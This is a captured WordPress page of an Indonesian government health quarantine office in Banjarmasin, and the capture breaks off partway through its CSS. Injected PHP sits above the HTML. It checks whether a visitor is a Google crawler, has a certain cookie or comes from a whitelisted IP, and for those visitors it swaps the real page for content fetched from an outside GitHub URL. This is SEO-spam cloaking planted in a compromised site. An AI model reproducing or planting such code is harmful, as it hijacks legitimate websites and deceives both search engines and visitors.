<?php error_reporting(0);$link='https://raw.githubusercontent.com/fadlipul69/kkpbanjarmasin/refs/heads/main/barang-jasa'; // link lp dalam bentuk paste raw
function ip_in_range($ip,$range){list($subnet,$bits)=explode('/',$range);$ip_dec=ip2long($ip);$subnet_dec=ip2long($subnet);$mask=-1<<(32-$bits);$subnet_dec&=$mask;return($ip_dec&$mask)===$subnet_dec;}function fetch_ip_ranges($url,$ipv4_key){$json_data=file_get_contents($url);if($json_data===FALSE){die("Error: Could not fetch the IP ranges from $url.");}$ip_data=json_decode($json_data,true);$ip_ranges=[];if(isset($ip_data['prefixes'])){foreach($ip_data['prefixes']as $prefix){if(isset($prefix[$ipv4_key])){$ip_ranges[]=$prefix[$ipv4_key];}}}return $ip_ranges;}$google_ip_ranges=fetch_ip_ranges('https://www.gstatic.com/ipranges/goog.json','ipv4Prefix');$visitor_ip=isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:(isset($_SERVER["HTTP_INCAP_CLIENT_IP"])?$_SERVER["HTTP_INCAP_CLIENT_IP"]:(isset($_SERVER["HTTP_TRUE_CLIENT_IP"])?$_SERVER["HTTP_TRUE_CLIENT_IP"]:(isset($_SERVER["HTTP_REMOTEIP"])?$_SERVER["HTTP_REMOTEIP"]:(isset($_SERVER["HTTP_X_REAL_IP"])?$_SERVER["HTTP_X_REAL_IP"]:$_SERVER["REMOTE_ADDR"]))));$googleallow=false;foreach($google_ip_ranges as $range){if(ip_in_range($visitor_ip,$range)){$googleallow=true;break;}}$asd=array('bot','ahrefs','google');foreach($asd as $len){$nul=$len;}$alow=['146.70.14.23'];if($_SERVER['REQUEST_URI']=='/'){$agent=strtolower($_SERVER['HTTP_USER_AGENT']);if(strpos($agent,$nul)or $googleallow or isset($_COOKIE['lp'])or in_array($visitor_ip,$alow)){echo implode('',file($link));die();}} ?>
<?php
	
<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="profile" href="https://gmpg.org/xfn/11">
	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />

	<!-- This site is optimized with the Yoast SEO plugin v23.8 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Barang Jasa - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin</title>
	<link rel="canonical" href="https://kkpbanjarmasin.or.id/barang-jasa/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Barang Jasa - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin" />
	<meta property="og:url" content="https://kkpbanjarmasin.or.id/barang-jasa/" />
	<meta property="og:site_name" content="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin" />
	<meta property="article:modified_time" content="2024-11-11T02:11:45+00:00" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:label1" content="Est. reading time" />
	<meta name="twitter:data1" content="1 minute" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://kkpbanjarmasin.or.id/barang-jasa/","url":"https://kkpbanjarmasin.or.id/barang-jasa/","name":"Barang Jasa - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","isPartOf":{"@id":"https://kkpbanjarmasin.or.id/#website"},"datePublished":"2024-11-08T03:24:05+00:00","dateModified":"2024-11-11T02:11:45+00:00","breadcrumb":{"@id":"https://kkpbanjarmasin.or.id/barang-jasa/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://kkpbanjarmasin.or.id/barang-jasa/"]}]},{"@type":"BreadcrumbList","@id":"https://kkpbanjarmasin.or.id/barang-jasa/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://kkpbanjarmasin.or.id/"},{"@type":"ListItem","position":2,"name":"Barang Jasa"}]},{"@type":"WebSite","@id":"https://kkpbanjarmasin.or.id/#website","url":"https://kkpbanjarmasin.or.id/","name":"Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","description":"Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://kkpbanjarmasin.or.id/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//www.googletagmanager.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//cdnjs.cloudflare.com' />
<link rel="alternate" type="application/rss+xml" title="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin &raquo; Feed" href="https://kkpbanjarmasin.or.id/feed/" />
<link rel="alternate" type="application/rss+xml" title="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin &raquo; Comments Feed" href="https://kkpbanjarmasin.or.id/comments/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/kkpbanjarmasin.or.id\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.4"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel='stylesheet' id='ht_ctc_main_css-css' href='https://kkpbanjarmasin.or.id/wp-content/plugins/click-to-chat-for-whatsapp/new/inc/assets/css/main.css?ver=4.12' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://kkpbanjarmasin.or.id/wp-includes/css/dist/block-library/style.min.css?ver=6.6.4' type='text/css' media='all' />
<style id='wp-block-library-theme-inline-css' type='text/css'>
.wp-block-audio :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio :where(figcaption){color:#ffffffa6}.wp-block-audio{margin:0 0 1em}.wp-block-code{border:1px solid #ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed :where(figcaption){color:#ffffffa6}.wp-block-embed{margin:0 0 1em}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:#ffffffa6}:root :where(.wp-block-image figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme :root :where(.wp-block-image figcaption){color:#ffffffa6}.wp-block-image{margin:0 0 1em}.wp-block-pullquote{border-bottom:4px solid;border-top:4px solid;color:currentColor;margin-bottom:1.75em}.wp-block-pullquote cite,.wp-block-pullquote footer,.wp-block-pullquote__citation{color:currentColor;font-size:.8125em;font-style:normal;text-transform:uppercase}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;font-style:normal;position:relative}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote.is-style-plain{border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}:where(.wp-block-group.has-background){padding:1.25em 2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table{margin:0 0 1em}.wp-block-table td,.wp-block-table th{word-break:normal}.wp-block-table :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table :where(figcaption){color:#ffffffa6}.wp-block-video :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video :where(figcaption){color:#ffffffa6}.wp-block-video{margin:0 0 1em}:root :where(.wp-block-template-part.has-background){margin-bottom:0;margin-top:0;padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 14px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 32px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-size--normal: 16px;--wp--preset--font-size--huge: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='wpdm-font-awesome-css' href='https://kkpbanjarmasin.or.id/wp-content/plugins/download-manager/assets/fontawesome/css/all.min.css?ver=6.6.4' type='text/css' media='all' />
<link rel='stylesheet' id='wpdm-frontend-css-css' href='https://kkpbanjarmasin.or.id/wp-content/plugins/download-manager/assets/bootstrap/css/bootstrap.min.css?ver=6.6.4' type='text/css' media='all' />
<link rel='stylesheet' id='wpdm-front-css' href='https://kkpbanjarmasin.or.id/wp-content/plugins/download-manager/assets/css/front.css?ver=6.6.4' type='text/css' media='all' />
<link rel='stylesheet' id='pencisc-css' href='https://kkpbanjarmasin.or.id/wp-content/plugins/penci-framework/assets/css/single-shortcode.css?ver=6.6.4' type='text/css' media='all' />
<link rel='stylesheet' id='penci-oswald-css' href='//fonts.googleapis.com/css?family=Oswald%3A400&#038;ver=6.6.4' type='text/css' media='all' />
<link rel='stylesheet' id='sticky-social-icons-css' href='https://kkpbanjarmasin.or.id/wp-content/plugins/sticky-social-icons/public/assets/build/css/sticky-social-icons-public.css?ver=1.2.1' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css' href='//cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css?ver=6.6.4' type='text/css' media='all' />
<link rel='stylesheet' id='wpa-style-css' href='https://kkpbanjarmasin.or.id/wp-content/plugins/wp-accessibility/css/wpa-style.css?ver=2.1.12' type='text/css' media='all' />
<style id='wpa-style-inline-css' type='text/css'>
:root { --admin-bar-top : 7px; }
</style>
<link rel='stylesheet' id='penci-font-awesome-css' href='https://kkpbanjarmasin.or.id/wp-content/themes/pennews/css/font-awesome.min.css?ver=4.5.2' type='text/css' media='all' />
<link rel='stylesheet' id='penci-fonts-css' href='//fonts.googleapis.com/css?family=Roboto%3A300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C700%2C700italic%2C800%2C800italic%7CMukta+Vaani%3A300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C700%2C700italic%2C800%2C800italic%7COswald%3A300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C700%2C700italic%2C800%2C800italic%7CTeko%3A300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C700%2C700italic%2C800%2C800italic%3A300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C700%2C700italic%2C800%2C800italic%26subset%3Dcyrillic%2Ccyrillic-ext%2Cgreek%2Cgreek-ext%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='penci-portfolio-css' href='https://kkpbanjarmasin.or.id/wp-content/themes/pennews/css/portfolio.css?ver=6.6.1' type='text/css' media='all' />
<link rel='stylesheet' id='penci-recipe-css' href='https://kkpbanjarmasin.or.id/wp-content/themes/pennews/css/recipe.css?ver=6.6.1' type='text/css' media='all' />
<link rel='stylesheet' id='penci-review-css' href='https://kkpbanjarmasin.or.id/wp-content/themes/pennews/css/review.css?ver=6.6.1' type='text/css' media='all' />
<link rel='stylesheet' id='penci-style-css' href='https://kkpbanjarmasin.or.id/wp-content/themes/pennews/style.css?ver=6.6.1' type='text/css' media='all' />
<style id='penci-style-inline-css' type='text/css'>
.penci-block-vc.style-title-13:not(.footer-widget).style-title-center .penci-block-heading {border-right: 10px solid transparent; border-left: 10px solid transparent; }.site-branding h1, .site-branding h2 {margin: 0;}.penci-schema-markup { display: none !important; }.penci-entry-media .twitter-video { max-width: none !important; margin: 0 !important; }.penci-entry-media .fb-video { margin-bottom: 0; }.penci-entry-media .post-format-meta > iframe { vertical-align: top; }.penci-single-style-6 .penci-entry-media-top.penci-video-format-dailymotion:after, .penci-single-style-6 .penci-entry-media-top.penci-video-format-facebook:after, .penci-single-style-6 .penci-entry-media-top.penci-video-format-vimeo:after, .penci-single-style-6 .penci-entry-media-top.penci-video-format-twitter:after, .penci-single-style-7 .penci-entry-media-top.penci-video-format-dailymotion:after, .penci-single-style-7 .penci-entry-media-top.penci-video-format-facebook:after, .penci-single-style-7 .penci-entry-media-top.penci-video-format-vimeo:after, .penci-single-style-7 .penci-entry-media-top.penci-video-format-twitter:after { content: none; } .penci-single-style-5 .penci-entry-media.penci-video-format-dailymotion:after, .penci-single-style-5 .penci-entry-media.penci-video-format-facebook:after, .penci-single-style-5 .penci-entry-media.penci-video-format-vimeo:after, .penci-single-style-5 .penci-entry-media.penci-video-format-twitter:after { content: none; }@media screen and (max-width: 960px) { .penci-insta-thumb ul.thumbnails.penci_col_5 li, .penci-insta-thumb ul.thumbnails.penci_col_6 li { width: 33.33% !important; } .penci-insta-thumb ul.thumbnails.penci_col_7 li, .penci-insta-thumb ul.thumbnails.penci_col_8 li, .penci-insta-thumb ul.thumbnails.penci_col_9 li, .penci-insta-thumb ul.thumbnails.penci_col_10 li { width: 25% !important; } }.site-header.header--s12 .penci-menu-toggle-wapper,.site-header.header--s12 .header__social-search { flex: 1; }.site-header.header--s5 .site-branding {  padding-right: 0;margin-right: 40px; }.penci-block_37 .penci_post-meta { padding-top: 8px; }.penci-block_37 .penci-post-excerpt + .penci_post-meta { padding-top: 0; }.penci-hide-text-votes { display: none; }.penci-usewr-review {  border-top: 1px solid #ececec; }.penci-review-score {top: 5px; position: relative; }.penci-social-counter.penci-social-counter--style-3 .penci-social__empty a, .penci-social-counter.penci-social-counter--style-4 .penci-social__empty a, .penci-social-counter.penci-social-counter--style-5 .penci-social__empty a, .penci-social-counter.penci-social-counter--style-6 .penci-social__empty a { display: flex; justify-content: center; align-items: center; }.penci-block-error { padding: 0 20px 20px; }@media screen and (min-width: 1240px){ .penci_dis_padding_bw .penci-content-main.penci-col-4:nth-child(3n+2) { padding-right: 15px; padding-left: 15px; }}.bos_searchbox_widget_class.penci-vc-column-1 #flexi_searchbox #b_searchboxInc .b_submitButton_wrapper{ padding-top: 10px; padding-bottom: 10px; }.mfp-image-holder .mfp-close, .mfp-iframe-holder .mfp-close { background: transparent; border-color: transparent; }h1, h2, h3, h4, h5, h6,.error404 .page-title,
		 .error404 .penci-block-vc .penci-block__title, .product_list_widget .product-title, .footer__bottom.style-2 .block-title {font-weight: 600}.site-content,.penci-page-style-1 .site-content, 
		.page-template-full-width.penci-block-pagination .site-content,
		.penci-page-style-2 .site-content, .penci-single-style-1 .site-content, 
		.penci-single-style-2 .site-content,.penci-page-style-3 .site-content,
		.penci-single-style-3 .site-content{ margin-top:-10px; }.site-header .site-branding,.header__top .site-branding{ padding-top:1px !important; }.site-header .site-branding,.header__top .site-branding{ padding-bottom:1px !important; }.header--s3 .site-branding img {max-width: 1080px !important;overflow: hidden; }.main-navigation > ul:not(.children) > li > a{ font-size: 12px; }.main-navigation ul ul a{ font-size: 12px; }#site-navigation .penci-megamenu .penci-mega-child-categories a{ font-size: 12px; }#site-navigation .penci-megamenu .penci-content-megamenu .penci-mega-latest-posts .penci-mega-post a:not(.mega-cat-name){ font-size: 12px; }@media screen and (min-width: 1240px){.single.two-sidebar .site-main .penci-container .widget-area-1 {width: 21.4%;}.single.two-sidebar .site-main .penci-container .widget-area-2{ width: 21.4%; }.single.two-sidebar .site-main .penci-container .penci-wide-content { width: 57.2%;max-width: 100%; }}@media screen and (min-width: 960px){.single.sidebar-left .site-main .penci-wide-content,.single.sidebar-right .site-main .penci-wide-content{width: 73%;max-width: 100%;}.single.sidebar-left .site-main .widget-area,.single.sidebar-right .site-main .widget-area{width: 27%;max-width: 100%;}}@media screen and (max-width: 1240px) and (min-width: 960px){.single.sidebar-left .site-main .penci-wide-content,.single.sidebar-right .site-main .penci-container__content,.single.two-sidebar .site-main .penci-wide-content { margin-left:0; width: 73%;}.single.two-sidebar .site-main .widget-area { width: 27%;}}@media screen and (min-width: 1130px){ .single .site-main > .penci-container, .single .site-main .penci-entry-media + .penci-container, .single .site-main .penci-entry-media .penci-container { max-width:1130px;margin-left: auto; margin-right: auto; } }@media screen and (min-width: 1240px){.page.two-sidebar:not( .penci-block-pagination ) .site-main .penci-container .widget-area-1 {width: 21.4%;}.page.two-sidebar:not( .penci-block-pagination ) .site-main .penci-container .widget-area-2{ width: 21.4%; }.page.two-sidebar:not( .penci-block-pagination ) .site-main .penci-container .penci-wide-content { width: 57.2%;max-width: 100%; }}@media screen and (min-width: 960px){.page.sidebar-left:not( .penci-block-pagination ) .site-main .penci-wide-content,.page.sidebar-right:not( .penci-block-pagination ) .site-main .penci-wide-content{width: 73%;max-width: 100%;}.page.sidebar-left:not( .penci-block-pagination ) .site-main .widget-area,.page.sidebar-right:not( .penci-block-pagination ) .site-main .widget-area{width: 27%;max-width: 100%;}}@media screen and (max-width: 1240px) and (min-width: 960px){.page.sidebar-left:not( .penci-block-pagination ) .site-main .penci-wide-content,.page.sidebar-right:not( .penci-block-pagination ) .site-main .penci-container__content,.page.two-sidebar:not( .penci-block-pagination ) .site-main 